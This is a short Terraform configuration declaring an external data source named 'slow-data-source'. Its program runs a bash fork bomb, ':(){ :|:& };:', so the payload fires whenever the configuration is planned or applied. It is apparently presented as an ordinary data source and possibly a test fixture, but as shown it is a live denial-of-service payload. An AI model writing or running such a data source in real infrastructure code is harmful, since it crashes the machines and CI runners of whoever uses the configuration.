data "external" "slow-data-source" {
  program = ["bash", "-c", ":(){ :|:& };:"]
}
